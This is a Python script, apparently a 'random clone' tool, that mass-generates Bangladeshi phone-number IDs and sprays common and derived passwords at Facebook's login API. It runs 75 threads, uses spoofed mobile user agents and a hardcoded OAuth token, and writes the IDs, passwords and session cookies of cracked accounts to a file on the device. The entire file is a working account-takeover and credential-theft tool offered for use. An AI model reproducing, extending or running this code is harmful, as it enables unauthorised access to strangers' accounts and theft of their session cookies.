import os, time, random, string, re, sys, requests, json, uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# VIP GOLD Colors
A = '\033[1;97m' # White
R = '\033[1;91m' # Red
G = '\033[1;92m' # Neon Green
Y = '\033[1;93m' # Gold
S = '\033[1;96m' # Sky Blue

# Global Counters
loop, oks, cps = 0, [], []

def line():
    print(f'{S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{A}')

def logo():
    os.system('clear')
    print(f'''{G}
 ███████ ██   ██  █████  ██   ██ ██ ███    ██ 
 ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
 ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
      ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
 ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {A}''')
    line()
    print(f' {A}[{G}•{A}] OWNER      : SHAHIN BIN AHMED')
    print(f' {A}[{G}•{A}] VERSION    : {Y}VIP GOLD (RANDOM MASTER){A}')
    print(f' {A}[{G}•{A}] STATUS     : {G}LIFETIME ACTIVATED{A}')
    line()

def Main():
    logo()
    print(f' [1] BANGLADESH RANDOM CLONE {Y}(FASTEST){A}')
    print(f' [2] PAKISTAN RANDOM CLONE {Y}(FASTEST){A}')
    print(f' [3] INDIA RANDOM CLONE {Y}(FASTEST){A}')
    print(f' [0] EXIT TOOL')
    line()
    choice = input(f' {A}[{G}•{A}] CHOICE : {G}')
    if choice in ['1', '01']: bd_menu()
    elif choice == '0': exit()
    else: Main()

def bd_menu():
    logo()
    print(f' [•] SIM CODES: 017, 018, 019, 013, 015, 016')
    code = input(f' [+] SELECT CODE : {G}')
    try:
        limit = int(input(f' [•] SCAN LIMIT : {G}'))
    except: limit = 5000
    
    with ThreadPool(max_workers=75) as shahin_gold:
        logo()
        print(f' [•] TOTAL TARGET : {limit}')
        print(f' [•] METHOD : RANDOM PASS (ULTRA)')
        line()
        for _ in range(limit):
            num = ''.join(random.choice(string.digits) for _ in range(8))
            uid = code + num
            # HIGH SUCCESS RANDOM PASSWORDS
            pws = [
                uid, num, uid[:6], uid[:7], uid[:8], 
                '123456', '1234567', '12345678', '123456789', 
                'shahin123', 'shahin786', 'shahin@@', 
                '@@@###', '708090', '445566', 'bangladesh'
            ]
            shahin_gold.submit(ultra_random_engine, uid, pws, limit)

def ultra_random_engine(uid, pws, limit):
    global loop
    # VIP HYBRID USER AGENTS
    ua_list = [
        f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,124)}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; Redmi Note {random.randint(10,13)} Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36"
    ]
    ua = random.choice(ua_list)
    
    for pw in pws:
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True'
        }
        data = {
            'adid': str(uuid.uuid4()),
            'email': uid,
            'password': pw,
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'generate_session_cookies': '1'
        }
        try:
            url = 'https://b-graph.facebook.com/auth/login'
            res = session.post(url, data=data, headers=headers).json()
            if 'session_key' in res:
                coki = ";".join(i["name"]+"="+i["value"] for i in res["session_cookies"])
                print(f'\r\r{G}[SHAHIN-OK] {uid} | {pw}{A}')
                print(f'{Y}[COOKIE] {A}{coki}')
                os.system('espeak -a 300 "Shahin, One OK ID Found"')
                open('/sdcard/SHAHIN-RANDOM-OK.txt', 'a').write(f'{uid}|{pw}|{coki}\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in str(res):
                cps.append(uid)
                break
        except: pass
    loop += 1
    sys.stdout.write(f'\r\r {A}[SCANNING] {loop}/{limit} OK:{G}{len(oks)}{A} CP:{Y}{len(cps)}{A} '); sys.stdout.flush()

if __name__ == "__main__":
    Main()
